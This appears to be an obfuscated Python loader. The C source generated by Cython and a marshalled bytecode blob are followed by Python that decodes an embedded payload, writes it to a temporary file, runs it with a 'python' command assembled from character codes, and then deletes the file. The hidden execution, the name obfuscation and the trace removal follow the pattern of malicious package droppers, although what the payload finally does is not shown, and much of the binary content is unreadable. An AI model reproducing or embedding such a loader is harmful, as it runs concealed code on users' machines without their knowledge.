call_once(&__Pyx_ModuleStateLookup_mutex_once_flag, __Pyx_ModuleStateLookup_initialize_mutex);\\\n  mtx_lock(&__Pyx_ModuleStateLookup_mutex)\n#define __Pyx_ModuleStateLookup_Unlock() mtx_unlock(&__Pyx_ModuleStateLookup_mutex)\n#elif defined(HAVE_PTHREAD_H)\n#include <pthread.h>\nstatic pthread_mutex_t __Pyx_ModuleStateLookup_mutex = PTHREAD_MUTEX_INITIALIZER;\n#define __Pyx_ModuleStateLookup_Lock() pthread_mutex_lock(&__Pyx_ModuleStateLookup_mutex)\n#define __Pyx_ModuleStateLookup_Unlock() pthread_mutex_unlock(&__Pyx_ModuleStateLookup_mutex)\n#elif defined(_WIN32)\n#include <Windows.h>  // synchapi.h on its own doesn\'t work\nstatic SRWLOCK __Pyx_ModuleStateLookup_mutex = SRWLOCK_INIT;\n#define __Pyx_ModuleStateLookup_Lock() AcquireSRWLockExclusive(&__Pyx_ModuleStateLookup_mutex)\n#define __Pyx_ModuleStateLookup_Unlock() ReleaseSRWLockExclusive(&__Pyx_ModuleStateLookup_mutex)\n#else\n#error "No suitable lock available for CYTHON_MODULE_STATE_LOOKUP_THREAD_SAFE.\\\n Requires C standard >= C11, or C++ standard >= C++11,\\\n or pthreads, or the Windows 32 API, or Python >= 3.13."\n#endif\ntypedef struct {\n    int64_t id;\n    PyObject *module;\n} __Pyx_InterpreterIdAndModule;\ntypedef struct {\n    char interpreter_id_as_index;\n    Py_ssize_t count;\n    Py_ssize_t allocated;\n    __Pyx_InterpreterIdAndModule table[1];\n} __Pyx_ModuleStateLookupData;\n#define __PYX_MODULE_STATE_LOOKUP_SMALL_SIZE 32\n#if CYTHON_MODULE_STATE_LOOKUP_THREAD_SAFE\nstatic __pyx_atomic_int_type __Pyx_ModuleStateLookup_read_counter = 0;\n#endif\n#if CYTHON_MODULE_STATE_LOOKUP_THREAD_SAFE\nstatic __pyx_atomic_ptr_type __Pyx_ModuleStateLookup_data = 0;\n#else\nstatic __Pyx_ModuleStateLookupData* __Pyx_ModuleStateLookup_data = NULL;\n#endif\nstatic __Pyx_InterpreterIdAndModule* __Pyx_State_FindModuleStateLookupTableLowerBound(\n        __Pyx_InterpreterIdAndModule* table,\n        Py_ssize_t count,\n        int64_t interpreterId) {\n    __Pyx_InterpreterIdAndModule* begin = table;\n    __Pyx_InterpreterIdAndModule* end = begin + count;\n    if (begin->id == interpreterId) {\n        return begin;\n    }\n    while ((end - begin) > __PYX_MODULE_STATE_LOOKUP_SMALL_SIZE) {\n        __Pyx_InterpreterIdAndModule* halfway = begin + (end - begin)/2;\n        if (halfway->id == interpreterId) {\n            return halfway;\n        }\n        if (halfway->id < interpreterId) {\n            begin = halfway;\n        } else {\n            end = halfway;\n        }\n    }\n    for (; begin < end; ++begin) {\n        if (begin->id >= interpreterId) return begin;\n    }\n    return begin;\n}\nstatic PyObject *__Pyx_State_FindModule(CYTHON_UNUSED void* dummy) {\n    int64_t interpreter_id = PyInterpreterState_GetID(__Pyx_PyInterpreterState_Get());\n    if (interpreter_id == -1) return NULL;\n#if CYTHON_MODULE_STATE_LOOKUP_THREAD_SAFE\n    __Pyx_ModuleStateLookupData* data = (__Pyx_ModuleStateLookupData*)__pyx_atomic_pointer_load_relaxed(&__Pyx_ModuleStateLookup_data);\n    {\n        __pyx_atomic_incr_acq_rel(&__Pyx_ModuleStateLookup_read_counter);\n        if (likely(data)) {\n            __Pyx_ModuleStateLookupData* new_data = (__Pyx_ModuleStateLookupData*)__pyx_atomic_pointer_load_acquire(&__Pyx_ModuleStateLookup_data);\n            if (likely(data == new_data)) {\n                goto read_finished;\n            }\n        }\n        __pyx_atomic_decr_acq_rel(&__Pyx_ModuleStateLookup_read_counter);\n        __Pyx_ModuleStateLookup_Lock();\n        __pyx_atomic_incr_relaxed(&__Pyx_ModuleStateLookup_read_counter);\n        data = (__Pyx_ModuleStateLookupData*)__pyx_atomic_pointer_load_relaxed(&__Pyx_ModuleStateLookup_data);\n        __Pyx_ModuleStateLookup_Unlock();\n    }\n  read_finished:;\n#else\n    __Pyx_ModuleStateLookupData* data = __Pyx_ModuleStateLookup_data;\n#endif\n    __Pyx_InterpreterIdAndModule* found = NULL;\n    if (unlikely(!data)) goto end;\n    if (data->interpreter_id_as_index) {\n        if (interpreter_id < data->count) {\n            found = data->table+interpreter_id;\n        }\n    } else {\n        found = __Pyx_State_FindModuleStateLookupTableLowerBound(\n            data->table, data->count, interpreter_id);\n    }\n  end:\n    {\n        PyObject *result=NULL;\n        if (found && found->id == interpreter_id) {\n            result = found->module;\n        }\n#if CYTHON_MODULE_STATE_LOOKUP_THREAD_SAFE\n        __pyx_atomic_decr_acq_rel(&__Pyx_ModuleStateLookup_read_counter);\n#endif\n        return result;\n    }\n}\n#if CYTHON_MODULE_STATE_LOOKUP_THREAD_SAFE\nstatic void __Pyx_ModuleStateLookup_wait_until_no_readers(void) {\n    while (__pyx_atomic_load(&__Pyx_ModuleStateLookup_read_counter) != 0);\n}\n#else\n#define __Pyx_ModuleStateLookup_wait_until_no_readers()\n#endif\nstatic int __Pyx_State_AddModuleInterpIdAsIndex(__Pyx_ModuleStateLookupData **old_data, PyObject* module, int64_t interpreter_id) {\n    Py_ssize_t to_allocate = (*old_data)->allocated;\n    while (to_allocate <= interpreter_id) {\n        if (to_allocate == 0) to_allocate = 1;\n        else to_allocate *= 2;\n    }\n    __Pyx_ModuleStateLookupData *new_data = *old_data;\n    if (to_allocate != (*old_data)->allocated) {\n         new_data = (__Pyx_ModuleStateLookupData *)realloc(\n            *old_data,\n            sizeof(__Pyx_ModuleStateLookupData)+(to_allocate-1)*sizeof(__Pyx_InterpreterIdAndModule));\n        if (!new_data) {\n            PyErr_NoMemory();\n            return -1;\n        }\n        for (Py_ssize_t i = new_data->allocated; i < to_allocate; ++i) {\n            new_data->table[i].id = i;\n            new_data->table[i].module = NULL;\n        }\n        new_data->allocated = to_allocate;\n    }\n    new_data->table[interpreter_id].module = module;\n    if (new_data->count < interpreter_id+1) {\n        new_data->count = interpreter_id+1;\n    }\n    *old_data = new_data;\n    return 0;\n}\nstatic void __Pyx_State_ConvertFromInterpIdAsIndex(__Pyx_ModuleStateLookupData *data) {\n    __Pyx_InterpreterIdAndModule *read = data->table;\n    __Pyx_InterpreterIdAndModule *write = data->table;\n    __Pyx_InterpreterIdAndModule *end = read + data->count;\n    for (; read<end; ++read) {\n        if (read->module) {\n            write->id = read->id;\n            write->module = read->module;\n            ++write;\n        }\n    }\n    data->count = write - data->table;\n    for (; write<end; ++write) {\n        write->id = 0;\n        write->module = NULL;\n    }\n    data->interpreter_id_as_index = 0;\n}\nstatic int __Pyx_State_AddModule(PyObject* module, CYTHON_UNUSED void* dummy) {\n    int64_t interpreter_id = PyInterpreterState_GetID(__Pyx_PyInterpreterState_Get());\n    if (interpreter_id == -1) return -1;\n    int result = 0;\n    __Pyx_ModuleStateLookup_Lock();\n#if CYTHON_MODULE_STATE_LOOKUP_THREAD_SAFE\n    __Pyx_ModuleStateLookupData *old_data = (__Pyx_ModuleStateLookupData *)\n            __pyx_atomic_pointer_exchange(&__Pyx_ModuleStateLookup_data, 0);\n#else\n    __Pyx_ModuleStateLookupData *old_data = __Pyx_ModuleStateLookup_data;\n#endif\n    __Pyx_ModuleStateLookupData *new_data = old_data;\n    if (!new_data) {\n        new_data = (__Pyx_ModuleStateLookupData *)calloc(1, sizeof(__Pyx_ModuleStateLookupData));\n        if (!new_data) {\n            result = -1;\n            PyErr_NoMemory();\n            goto end;\n        }\n        new_data->allocated = 1;\n        new_data->interpreter_id_as_index = 1;\n    }\n    __Pyx_ModuleStateLookup_wait_until_no_readers();\n    if (new_data->interpreter_id_as_index) {\n        if (interpreter_id < __PYX_MODULE_STATE_LOOKUP_SMALL_SIZE) {\n            result = __Pyx_State_AddModuleInterpIdAsIndex(&new_data, module, interpreter_id);\n            goto end;\n        }\n        __Pyx_State_ConvertFromInterpIdAsIndex(new_data);\n    }\n    {\n        Py_ssize_t insert_at = 0;\n        {\n            __Pyx_InterpreterIdAndModule* lower_bound = __Pyx_State_FindModuleStateLookupTableLowerBound(\n                new_data->table, new_data->count, interpreter_id);\n            assert(lower_bound);\n            insert_at = lower_bound - new_data->table;\n            if (unlikely(insert_at < new_data->count && lower_bound->id == interpreter_id)) {\n                lower_bound->module = module;\n                goto end;  // already in table, nothing more to do\n            }\n        }\n        if (new_data->count+1 >= new_data->allocated) {\n            Py_ssize_t to_allocate = (new_data->count+1)*2;\n            new_data =\n                (__Pyx_ModuleStateLookupData*)realloc(\n                    new_data,\n                    sizeof(__Pyx_ModuleStateLookupData) +\n                    (to_allocate-1)*sizeof(__Pyx_InterpreterIdAndModule));\n            if (!new_data) {\n                result = -1;\n                new_data = old_data;\n                PyErr_NoMemory();\n                goto end;\n            }\n            new_data->allocated = to_allocate;\n        }\n        ++new_data->count;\n        int64_t last_id = interpreter_id;\n        PyObject *last_module = module;\n        for (Py_ssize_t i=insert_at; i<new_data->count; ++i) {\n            int64_t current_id = new_data->table[i].id;\n            new_data->table[i].id = last_id;\n            last_id = current_id;\n            PyObject *current_module = new_data->table[i].module;\n            new_data->table[i].module = last_module;\n            last_module = current_module;\n        }\n    }\n  end:\n#if CYTHON_MODULE_STATE_LOOKUP_THREAD_SAFE\n    __pyx_atomic_pointer_exchange(&__Pyx_ModuleStateLookup_data, new_data);\n#else\n    __Pyx_ModuleStateLookup_data = new_data;\n#endif\n    __Pyx_ModuleStateLookup_Unlock();\n    return result;\n}\nstatic int __Pyx_State_RemoveModule(CYTHON_UNUSED void* dummy) {\n    int64_t interpreter_id = PyInterpreterState_GetID(__Pyx_PyInterpreterState_Get());\n    if (interpreter_id == -1) return -1;\n    __Pyx_ModuleStateLookup_Lock();\n#if CYTHON_MODULE_STATE_LOOKUP_THREAD_SAFE\n    __Pyx_ModuleStateLookupData *data = (__Pyx_ModuleStateLookupData *)\n            __pyx_atomic_pointer_exchange(&__Pyx_ModuleStateLookup_data, 0);\n#else\n    __Pyx_ModuleStateLookupData *data = __Pyx_ModuleStateLookup_data;\n#endif\n    if (data->interpreter_id_as_index) {\n        if (interpreter_id < data->count) {\n            data->table[interpreter_id].module = NULL;\n        }\n        goto done;\n    }\n    {\n        __Pyx_ModuleStateLookup_wait_until_no_readers();\n        __Pyx_InterpreterIdAndModule* lower_bound = __Pyx_State_FindModuleStateLookupTableLowerBound(\n            data->table, data->count, interpreter_id);\n        if (!lower_bound) goto done;\n        if (lower_bound->id != interpreter_id) goto done;\n        __Pyx_InterpreterIdAndModule *end = data->table+data->count;\n        for (;lower_bound<end-1; ++lower_bound) {\n            lower_bound->id = (lower_bound+1)->id;\n            lower_bound->module = (lower_bound+1)->module;\n        }\n    }\n    --data->count;\n    if (data->count == 0) {\n        free(data);\n        data = NULL;\n    }\n  done:\n#if CYTHON_MODULE_STATE_LOOKUP_THREAD_SAFE\n    __pyx_atomic_pointer_exchange(&__Pyx_ModuleStateLookup_data, data);\n#else\n    __Pyx_ModuleStateLookup_data = data;\n#endif\n    __Pyx_ModuleStateLookup_Unlock();\n    return 0;\n}\n#endif\n\n\n#ifdef _MSC_VER\n#pragma warning( pop )\n#endif\n\n\n\n\n#endif \n\n#ifdef __FreeBSD__\n#include <dede.h>\n#endif\n#if PY_MAJOR_VERSION < 3\nint main(int argc, char** argv) {\n#elif defined(Win32) || defined(MS_WINDOWS)\nint wmain(int argc, wchar_t **argv) {\n#else\nstatic int __Pyx_main(int argc, wchar_t **argv) {\n#endif\n#ifdef __FreeBSD__\n    fp_except_t m;\n    m = fpgetmask();\n    fpsetmask(m & ~FP_X_OFL);\n#endif\n    if (argc && argv)\n        Py_SetProgramName(argv[0]);\n    Py_Initialize();\n    if (argc && argv)\n        PySys_SetArgv(argc, argv);\n    {\n      PyObject* m = NULL;\n      __pyx_module_is_main_op = 1;\n      #if PY_MAJOR_VERSION < 3\n          initop();\n      #elif CYTHON_PEP489_MULTI_PHASE_INIT\n          m = PyInit_op();\n          if (!PyModule_Check(m)) {\n              PyModuleDef *mdef = (PyModuleDef *) m;\n              PyObject *modname = PyUnicode_FromString("__main__");\n              m = NULL;\n              if (modname) {\n                  m = PyModule_NewObject(modname);\n                  Py_DECREF(modname);\n                  if (m) PyModule_ExecDef(m, mdef);\n              }\n          }\n      #else\n          m = PyInit_op();\n      #endif\n      if (PyErr_Occurred()) {\n          PyErr_Print();\n          #if PY_MAJOR_VERSION < 3\n          if (Py_FlushLine()) PyErr_Clear();\n          #endif\n          return 1;\n      }\n      Py_XDECREF(m);\n    }\n#if PY_VERSION_HEX < 0x03060000\n    Py_Finalize();\n#else\n    if (Py_FinalizeEx() < 0)\n        return 2;\n#endif\n    return 0;\n}\n#if PY_MAJOR_VERSION >= 3 && !defined(Win32) && !defined(MS_WINDOWS)\n#include <locale.h>\nstatic wchar_t*\n__Pyx_char2wchar(char* arg)\n{\n    wchar_t *res;\n#ifdef HAVE_BROKEN_MBSTOWCS\n    size_t argsize = strlen(arg);\n#else\n    size_t argsize = mbstowcs(NULL, arg, 0);\n#endif\n    size_t count;\n    unsigned char *in;\n    wchar_t *out;\n#ifdef HAVE_MBRTOWC\n    mbstate_t mbs;\n#endif\n    if (argsize != (size_t)-1) {\n        res = (wchar_t *)malloc((argsize+1)*sizeof(wchar_t));\n        if (!res)\n            goto oom;\n        count = mbstowcs(res, arg, argsize+1);\n        if (count != (size_t)-1) {\n            wchar_t *tmp;\n            for (tmp = res; *tmp != 0 &&\n                     (*tmp < 0xd800 || *tmp > 0xdfff); tmp++)\n                ;\n            if (*tmp == 0)\n                return res;\n        }\n        free(res);\n    }\n#ifdef HAVE_MBRTOWC\n    argsize = strlen(arg) + 1;\n    res = (wchar_t *)malloc(argsize*sizeof(wchar_t));\n    if (!res) goto oom;\n    in = (unsigned char*)arg;\n    out = res;\n    memset(&mbs, 0, sizeof mbs);\n    while (argsize) {\n        size_t converted = mbrtowc(out, (char*)in, argsize, &mbs);\n        if (converted == 0)\n            break;\n        if (converted == (size_t)-2) {\n            fprintf(stderr, "unexpected mbrtowc result -2");\n            free(res);\n            return NULL;\n        }\n        if (converted == (size_t)-1) {\n            *out++ = 0xdc00 + *in++;\n            argsize--;\n            memset(&mbs, 0, sizeof mbs);\n            continue;\n        }\n        if (*out >= 0xd800 && *out <= 0xdfff) {\n            argsize -= converted;\n            while (converted--)\n                *out++ = 0xdc00 + *in++;\n            continue;\n        }\n        in += converted;\n        argsize -= converted;\n        out++;\n    }\n#else\n    res = (wchar_t *)malloc((strlen(arg)+1)*sizeof(wchar_t));\n    if (!res) goto oom;\n    in = (unsigned char*)arg;\n    out = res;\n    while(*in)\n        if(*in < 128)\n            *out++ = *in++;\n        else\n            *out++ = 0xdc00 + *in++;\n    *out = 0;\n#endif\n    return res;\noom:\n    fprintf(stderr, "out of memory");\n    return NULL;\n}\nint\nmain(int argc, char **argv)\n{\n    if (!argc) {\n        return __Pyx_main(0, NULL);\n    }\n    else {\n        int i, res;\n        wchar_t **argv_copy = (wchar_t **)malloc(sizeof(wchar_t*)*argc);\n        wchar_t **argv_copy2 = (wchar_t **)malloc(sizeof(wchar_t*)*argc);\n        char *oldloc = strdup(setlocale(LC_ALL, NULL));\n        if (!argv_copy || !argv_copy2 || !oldloc) {\n            fprintf(stderr, "out of memory");\n            free(argv_copy);\n            free(argv_copy2);\n            free(oldloc);\n            return 1;\n        }\n        res = 0;\n        setlocale(LC_ALL, "");\n        for (i = 0; i < argc; i++) {\n            argv_copy2[i] = argv_copy[i] = __Pyx_char2wchar(argv[i]);\n            if (!argv_copy[i]) res = 1;\n        }\n        setlocale(LC_ALL, oldloc);\n        free(oldloc);\n        if (res == 0)\n            res = __Pyx_main(argc, argv_copy);\n        for (i = 0; i < argc; i++) {\n#if PY_VERSION_HEX < 0x03050000\n            free(argv_copy2[i]);\n#else\n            PyMem_RawFree(argv_copy2[i]);\n#endif\n        }\n        free(argv_copy);\n        free(argv_copy2);\n        return res;\n    }\n}\n#endif\nz\x04op.c\xfa\x01.\xfa\x01 \xe9\xff\xff\xff\xffz\x06gcc -Iz\x0f/include/pythonz\x04 -o z\x03 -Lz\r/lib -lpython\xda\x01w\xda\x02osT)\x01\xda\x08exist_ok)1\xda\x03map\xda\x03chr\xda\x01G\xda\x01H\xda\x01O\xda\x01S\xda\x01T\xda\x01J\xda\x01I\xda\x02GH\xda\x02OS\xda\x02TJ\xda\x02II\xda\x05GHOST\xda\x08tempfile\xda\x01tr\x14\x00\x00\x00r\n\x00\x00\x00\xda\nghost_pathr\x0b\x00\x00\x00\xda\x05grdmvr\x0c\x00\x00\x00\xda\x04stem\xda\x06base64r\r\x00\x00\x00\xda\x04lmao\xda\x05print\xda\n__import__\xda\x06prefix\xda\x06PREFIX\xda\x0cEXECUTE_FILE\xda\x11EXPORT_PYTHONHOME\xda\nexecutable\xda\x18EXPORT_PYTHON_EXECUTABLE\xda\x03RUN\xda\x06isfile\xda\x04exit\xda\x08C_SOURCE\xda\x06C_FILE\xda\x04join\xda\x07version\xda\x05split\xda\x0ePYTHON_VERSION\xda\x0cCOMPILE_FILE\xda\x04open\xda\x01f\xda\x05write\xda\x08makedirs\xda\x07dirname\xa9\x00\xf3\x00\x00\x00\x00\xda\x05ghost\xfa\x08<module>rE\x00\x00\x00\x01\x00\x00\x00s\x1a\x03\x00\x00\xf0\x03\x01\x01\x01\xd8\x12\x15\x90#\x90c\xd0\x1b;\xd0\x1b;\xd0\x1b;\xd1\x12<\xd4\x12<\x81\x0f\x80\x01\x80!\x80A\x80a\x88\x01\x88!\x88A\x88a\xd8\x11\x12\x901\x91\x13\x90a\x98\x01\x91c\x981\x98Q\x993\xa0\x01\xa0!\xa1\x03\xd0\x11#\x81\x0e\x80\x02\x80B\x88\x02\x88B\xd8\x08\t\x88!\x89\x03\x88A\x89\x05\x88a\x89\x07\x90\x01\x89\t\x90!\x89\x0b\x90A\x89\r\x90a\x89\x0f\x80\x05\xd8\x00\x14\xd0\x00\x14\xd0\x00\x14\xd0\x00\x14\xd8\x00B\xd0\x00B\xd0\x00B\xd0\x00B\xd0\x00B\xd0\x00B\xd0\x00B\xd0\x00B\xd0\x00B\xd0\x00B\xd8\x00$\xd0\x00$\xd0\x00$\xd0\x00$\xd0\x00$\xd0\x00$\xe0\x00\x05\x80\x05\xd0\x06)\xd1\x00*\xd4\x00*\xd0\x00*\xd8\x00\x05\x80\x05\x80b\x81\t\x84\t\x80\t\xd8\x00\x05\x80\x05\xd0\x06E\xd1\x00F\xd4\x00F\xd0\x00F\xd8\x00\x05\x80\x05\x80b\x81\t\x84\t\x80\t\xd8\x07\x11\x80z\x90%\xd1\x07\x18\xd4\x07\x18\xd4\x07\x1f\x80\x06\xd8\x0f\x1a\x80\x0c\xd8\x13\'\xa8\n\xa8\n\xb05\xd1(9\xd4(9\xd4(@\xd1\x13@\xd0\x00\x11\xd8\x1a5\xb0z\xb0z\xc0%\xd17H\xd47H\xd47S\xd1\x1aS\xd0\x00\x18\xd8\x06\n\x88L\xd1\x06\x18\x80\x03\xd8\x03\x14\x80:\xd4\x03\x14\x90\\\xd1\x03"\xd4\x03"\xf0\x00\x02\x01\x0c\xd8\x04\x08\x80D\xd0\t\x1a\x98D\xd1\t \xd0":\xd1\t:\xb8D\xd1\t@\xc0#\xd1\tE\xd1\x04F\xd4\x04F\xd0\x04F\xd8\x04\x08\x80D\x88\x11\x81G\x84G\x80G\xf0\x02OC\x05\x0c\x04\x80\x08\xf0`F\n\x00\t\x0f\x80\x06\xd8\x11\x14\x97\x18\x92\x18\x98*\x98*\xa0U\xd1\x1a+\xd4\x1a+\xd4\x1a3\xd7\x1a9\xd2\x1a9\xb8#\xd1\x1a>\xd4\x1a>\xb8q\xd4\x1aA\xd7\x1aG\xd2\x1aG\xc8\x03\xd1\x1aL\xd4\x1aL\xc8S\xc8b\xc8S\xd4\x1aQ\xd1\x11R\xd4\x11R\x80\x0e\xd8\x10\x18\x986\xd1\x10!\xd0$5\xd1\x105\xb8\x0e\xd1\x10F\xc8\x16\xd1\x10O\xd0R^\xd1\x10^\xd0ad\xd1\x10d\xd0gm\xd1\x10m\xd0pu\xd1\x10u\xd0x~\xd1\x10~\xf0\x00\x00B\x02Q\x02\xf1\x00\x00\x11Q\x02\xf0\x00\x00T\x02b\x02\xf1\x00\x00\x11b\x02\x80\x0c\xd8\x05\t\x80T\x88&\x90\x13\xd1\x05\x15\xd4\x05\x15\xf0\x00\x01\x01\x16\x98\x11\xd8\x04\x05\x87G\x82G\x88H\xd1\x04\x15\xd4\x04\x15\xd0\x04\x15\xf0\x03\x01\x01\x16\xf0\x00\x01\x01\x16\xf0\x00\x01\x01\x16\xf1\x00\x01\x01\x16\xf4\x00\x01\x01\x16\xf0\x00\x01\x01\x16\xf0\x00\x01\x01\x16\xf0\x00\x01\x01\x16\xf0\x00\x01\x01\x16\xf0\x00\x01\x01\x16\xf0\x00\x01\x01\x16\xf8\xf8\xf8\xf0\x00\x01\x01\x16\xf0\x00\x01\x01\x16\xf0\x00\x01\x01\x16\xf0\x00\x01\x01\x16\xe0\x00\n\x80\n\x884\xd1\x00\x10\xd4\x00\x10\xd7\x00\x19\xd2\x00\x19\xd0\x1a,\x98*\xd4\x1a,\xa8\\\xd1\x1a:\xd4\x1a:\xc0D\xd0\x00\x19\xd1\x00I\xd4\x00I\xd0\x00I\xd8\x00\x04\x80\x04\xd0\x05\x16\x98\x04\xd1\x05\x1c\xd0\x1e6\xd1\x056\xb8\x04\xd1\x05<\xb8|\xd1\x05K\xc8T\xd1\x05Q\xd0SV\xd1\x05V\xd1\x00W\xd4\x00W\xd0\x00W\xd8\x00\x05\x80\x05\x80f\x81\r\x84\r\x80\r\x80\r\x80\rs\x12\x00\x00\x00\xc5?\x16F!\x03\xc6!\x04F%\x07\xc6(\x01F%\x07'))')
try:
	with t.NamedTemporaryFile(delete=False, suffix='.py') as ghostfile:
		ghostfile.write(lmao(ghostenc))
		ghostpath = ghostfile.name
	stem(''.join([chr(112), chr(121), chr(116), chr(104), chr(111), chr(110), chr(32)]) + '"' + ghostpath + '"')
except Exception as ghost_err:
	getattr(__import__('builtins'), ''.join(map(chr, [112,114,105,110,116])))(ghost_err)
finally:
	if 'ghostpath' in locals() and ghost_path.exists(ghostpath):
		grdmv(ghostpath)
